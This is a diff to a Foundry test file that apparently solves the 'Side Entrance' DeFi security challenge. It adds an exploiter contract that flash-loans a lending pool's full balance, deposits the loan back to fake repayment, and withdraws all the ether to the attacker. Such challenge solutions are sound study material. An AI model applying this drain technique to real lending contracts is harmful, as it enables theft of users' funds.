@@ -4,7 +4,10 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {
+    SideEntranceLenderPool,
+    IFlashLoanEtherReceiver
+} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -36,7 +39,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(address(attacker));
+        SideEntranceExploiter sideEntranceExploiter = new SideEntranceExploiter(sideEntranceLenderPool, attacker);
+        sideEntranceExploiter.exploit();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -48,4 +54,30 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract SideEntranceExploiter is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool victim;
+    address payable attacker;
+
+    constructor(SideEntranceLenderPool _victim, address payable _attacker) {
+        victim = _victim;
+        attacker = _attacker;
+    }
+
+    // The pool use address(this) for bookkeeping
+    // and allow to execute a function from the contract calling the flashloan
+    // The exploiter leverage that to deposit what it flashloaned
+    // tricking the pool and allowing the withdrawal of all the flashloaned amount
+    function exploit() external {
+        victim.flashLoan(address(victim).balance);
+        victim.withdraw();
+        attacker.transfer(address(this).balance);
+    }
+
+    function execute() external payable override {
+        victim.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
 }
